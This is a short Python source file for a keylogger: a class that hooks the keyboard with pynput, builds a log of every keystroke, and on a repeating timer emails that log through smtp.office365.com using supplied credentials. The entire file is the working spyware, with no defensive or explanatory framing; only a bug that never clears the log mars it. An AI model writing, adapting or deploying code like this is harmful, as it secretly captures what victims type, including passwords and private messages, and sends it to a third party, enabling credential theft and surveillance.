#!/usr/bin/env python

from pynput import keyboard
import threading
import smtplib

class Keyl:

    def __init__(self, time_inter, eml, pawd):
        self.log = ""
        self.timer = ""
        self.time_inter = time_inter
        self.eml = eml
        self.pawd = pawd

    def on_key_press(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.log = self.log + " "
            elif key == keyboard.Key.enter:
                self.log = self.log + "\n"
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1]
            elif key == keyboard.Key.esc:
                self.timer.cancel()
                return False
            else:
                print(key)
                #return
    
    def s_mail(self):
        server = smtplib.SMTP("smtp.office365.com", "587")
        server.starttls()
        server.login(self.eml, self.pawd)
        server.sendmail(self.eml, self.eml, self.log)
        server.quit()

    def report(self):
        self.s_mail()
        print(self.log)
        log = ""
        self.timer = threading.Timer(self.time_inter, self.report)
        self.timer.start()

    def startK(self):
        with keyboard.Listener(on_press=self.on_key_press) as listener:
            self.report()
            listener.join()